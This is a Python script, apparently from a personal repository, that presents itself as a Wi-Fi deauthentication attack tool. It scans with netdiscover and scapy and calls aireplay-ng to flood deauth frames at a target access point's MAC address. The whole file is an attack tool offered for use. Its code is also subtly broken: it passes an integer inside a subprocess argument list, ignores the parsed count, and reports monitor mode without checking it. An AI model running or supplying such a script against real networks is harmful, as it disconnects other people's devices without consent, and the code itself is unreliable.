#!/usr/bin/python3

# deauth attack use for windows and linux

import os
import sys
import time
import subprocess
import argparse
import colorama
import scapy.all as scapy
import threading
from netdiscover import *


# colorama init
colorama.init()

class Deauth:

    def __init__(self,interface,mac):
        self.interface = interface
        self.mac = mac
    
    # ip scan
    def ip_scan(self,interface):
        print("[+] Scanning...")
        time.sleep(1)
        try:
            subprocess.check_output(["netdiscover"])
        except subprocess.CalledProcessError:
            print("[-] Please install netdiscover.")
            print("[?] Do you want to install netdiscover? (Y/n)")
            answer = input(">>> ")
            if answer == "Y" or answer == "y":
                subprocess.check_output(["sudo","apt-get","install","netdiscover"])
            elif answer == "N" or answer == "n":
                print("[-] Exiting...")
                sys.exit()
            else:
                print("[-] Please enter Y or N.")
                sys.exit(1)
        

    # check monitor mode
    def check_monitor_mode(self,interface):
        print("[+] Checking monitor mode...")
        time.sleep(1)
        try:
            subprocess.check_output(["iwconfig",interface])
        except subprocess.CalledProcessError:
            print("[-] Please check your interface name.")
            sys.exit(1)
        else:
            print("[+] Monitor mode is on.")
    
    
    # get mac address
    def get_mac(self,ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    
    
    # send deauth packet
    def send_deauth(self,interface,mac , count=0):
        print("[+] Sending deauth packet...")
        time.sleep(1)
        try:
            subprocess.check_output(["aireplay-ng","--deauth",int(count),"-a",mac,interface])
        except subprocess.CalledProcessError:
            print("[-] Please check your interface name.")
            sys.exit(1)
        else:
            print("[+] Deauth packet sent.")

    # start deauth
    def start_deauth(self):
        self.ip_scan(self.interface)
        self.check_monitor_mode(self.interface)
        self.send_deauth(self.interface,self.mac)
        
# arguman
def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Interface Name")
    parser.add_argument("-m","--mac",dest="mac",help="Mac Address")
    parser.add_argument("-c","--count",dest="count",help="Count")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface name, use --help for more info.")
    elif not options.mac:
        parser.error("[-] Please specify a mac address, use --help for more info.")
    elif not options.count:
        parser.error("[-] Please specify a count, use --help for more info.")
    return options
 

# main
def main():
    options = arguments()
    deauth = Deauth(options.interface,options.mac)
    deauth.start_deauth()

if __name__ == "__main__":
    main()

# Path: python\deauth\deauth.py